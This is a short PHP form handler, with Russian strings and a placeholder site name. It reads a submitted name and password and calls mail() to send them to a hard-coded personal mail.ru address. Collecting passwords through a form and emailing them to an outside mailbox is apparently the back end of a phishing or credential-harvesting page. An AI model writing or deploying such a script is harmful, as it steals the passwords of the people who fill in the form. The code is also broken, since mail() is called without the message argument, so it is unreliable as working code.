<?php

$recepient = "nastya.vallo@mail.ru";
$sitename = "Название сайта";

$name = trim($_POST["name"]);
$password = trim($_POST["password"]);
$message = "Имя: $name \nПароль: $password";

$pagetitle = "Новая заявка с сайта \"$sitename\"";
mail($recepient, $pagetitle);

